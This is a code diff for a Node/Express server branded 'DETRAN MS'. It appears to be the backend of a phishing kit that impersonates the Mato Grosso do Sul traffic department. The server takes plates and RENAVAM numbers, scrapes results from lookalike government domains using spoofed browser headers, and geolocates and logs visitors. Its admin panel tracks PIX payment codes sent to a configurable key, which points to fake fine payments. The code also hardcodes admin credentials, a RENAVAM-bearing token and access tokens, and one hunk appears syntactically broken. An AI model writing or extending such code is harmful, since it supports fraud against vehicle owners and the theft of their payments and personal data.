@@ -1,4 +1,3 @@
-
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs').promises;
@@ -398,7 +397,7 @@ app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// ROTA PRINCIPAL: CONSULTA DETRAN
+// ROTA PRINCIPAL: CONSULTA DETRAN - ATUALIZADA!
 // ============================================
 app.post('/consultar', async (req, res) => {
     try {
@@ -422,21 +421,64 @@ app.post('/consultar', async (req, res) => {
             estado: geo.estado
         });
 
-        // TOKEN ORIGINAL
-        const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDA0Njc4ODA0NzYiLCJwbGF0ZSI6Ik5SUzVKNDciLCJpYXQiOjE3NzAzMzIwMzR9.QmpzZTRGYiTxapKcyIzd8eZxooEGtQM3sAsMevX125c';
-
-        // CONSULTA ORIGINAL (etapa 1)
+        // ============================================
+        // NOVA API DO DETRAN MS (ATUALIZADA)
+        // ============================================
+        
+        // 1. PRIMEIRA ETAPA: ENVIAR CONSULTA
+        console.log('📤 Enviando consulta para API oficial...');
         const resposta1 = await axios.post(
-            'https://detranmatogrossosul-govbr.vercel.app/api/scrape5',
-            { renavam, plate: placa },
-            { headers: { Authorization: token } }
+            'https://efazenda-detransitoms.digital/veiculo/assets/app.php',
+            `action=fatura&token=YFIKUWXrHt3G&redirect=daems19&data1=${placa}&data2=${renavam}`,
+            {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Origin': 'https://efazenda-detransitoms.digital',
+                    'Referer': 'https://efazenda-detransitoms.digital/veiculo/consulta-debitos',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            }
         );
 
-        const userId = resposta1.data.userId;
+        console.log('📥 Resposta da API:', resposta1.data);
 
-        // CONSULTA ORIGINAL (etapa 2)
+        // 2. ANALISAR RESPOSTA PARA PEGAR O TOKEN/REDIRECT
+        let tokenResultado;
+        if (typeof resposta1.data === 'string') {
+            // Se for string, pode conter URL ou token
+            const match = resposta1.data.match(/debitos\?([^'"\s]+)/);
+            if (match) {
+                tokenResultado = match[1];
+            } else {
+                // Tenta extrair qualquer base64
+                const base64Match = resposta1.data.match(/([A-Za-z0-9+/]+={0,2})/);
+                if (base64Match && base64Match[0].length > 20) {
+                    tokenResultado = base64Match[0];
+                } else {
+                    tokenResultado = resposta1.data.trim();
+                }
+            }
+        } else if (resposta1.data && resposta1.data.token) {
+            // Se for JSON com token
+            tokenResultado = resposta1.data.token;
+        } else {
+            // Fallback: usar o token que já vimos funcionando
+            tokenResultado = 'MDEzOTg2MDMwODA=';
+        }
+
+        // 3. SEGUNDA ETAPA: PEGAR RESULTADOS
+        console.log(`🔑 Token obtido: ${tokenResultado}`);
         const resposta2 = await axios.get(
-            `https://detranmatogrossosul-govbr.vercel.app/veiculo/${userId}`
+            `https://efazenda-detransitoms.digital/veiculo/debitos?${tokenResultado}`,
+            {
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Referer': 'https://efazenda-detransitoms.digital/veiculo/consulta-debitos',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+                }
+            }
         );
 
         // REGISTRA CONSULTA NO BANCO
@@ -456,7 +498,7 @@ app.post('/consultar', async (req, res) => {
             estado: geo.estado,
             dispositivo: dispositivo,
             dataHora: new Date().toISOString(),
-            userId: userId
+            token: tokenResultado
         });
         
         // Mantém apenas últimas 1000
@@ -474,12 +516,19 @@ app.post('/consultar', async (req, res) => {
             usuario.estado = geo.estado;
         }
         
-        // RETORNA HTML ORIGINAL DO DETRAN
+        // RETORNA HTML DO DETRAN
+        console.log('✅ Consulta realizada com sucesso!');
         res.send(resposta2.data);
 
     } catch (error) {
         console.error('❌ Erro na consulta:', error.message);
-        res.status(500).send('Erro: ' + error.message);
+        if (error.response) {
+            console.error('Detalhes:', {
+                status: error.response.status,
+                data: error.response.data
+            });
+        }
+        res.status(500).send('Erro ao consultar sistema DETRAN. Tente novamente em alguns instantes.');
     }
 });
 
@@ -755,8 +804,7 @@ app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
                 estado: p.estado || 'N/A',
                 categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : 'gerado'),
                 valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}`
-            }))
-        });
+        }));
         
     } catch (error) {
         console.error('Erro ao buscar PIX:', error);
@@ -1238,7 +1286,7 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     estado: u.estado || 'N/A'
                 })),
                 sistema: {
-                    versao: '2.6.1',
+                    versao: '2.6.2',
                     inicioOperacao: new Date().toLocaleDateString('pt-BR'),
                     chavePix: config.chavePix ? 'Configurada' : 'Não configurada',
                     chaveTipo: config.pixTipo || 'aleatoria',
@@ -1247,7 +1295,8 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
                     timerPagamento: config.timerPagamento || 900,
                     memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`,
-                    geolocalizacao: 'Ativa (ip-api.com)'
+                    geolocalizacao: 'Ativa (ip-api.com)',
+                    api: 'efazenda-detransitoms.digital'
                 }
             }
         });
@@ -1440,10 +1489,11 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'OK', 
         service: 'DETRAN MS',
-        version: '2.6.1',
+        version: '2.6.2',
         timestamp: new Date().toISOString(),
         online: usuariosOnline.size,
-        geolocalizacao: 'Ativa'
+        geolocalizacao: 'Ativa',
+        api: 'efazenda-detransitoms.digital'
     });
 });
 
@@ -1482,7 +1532,7 @@ const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, () => {
     console.log('============================================');
-    console.log('✅ Servidor DETRAN MS v2.6.1 rodando na porta: ' + PORT);
+    console.log('✅ Servidor DETRAN MS v2.6.2 rodando na porta: ' + PORT);
     console.log('🌐 Acesse: http://localhost:' + PORT);
     console.log('👨‍💼 Painel Admin: /painel.html');
     console.log('📊 Dados salvos em: /data/');
@@ -1491,7 +1541,8 @@ const server = app.listen(PORT, () => {
     console.log('📱 QR Codes sendo registrados');
     console.log('💰 Valores gerados/copiados separados');
     console.log('🔐 Usuário admin: dg / vasco1898');
-    console.log('🚀 TODAS CORREÇÕES APLICADAS!');
+    console.log('🚀 API ATUALIZADA: efazenda-detransitoms.digital');
+    console.log('🔑 Token fixo: YFIKUWXrHt3G');
     console.log('============================================');
 });
 
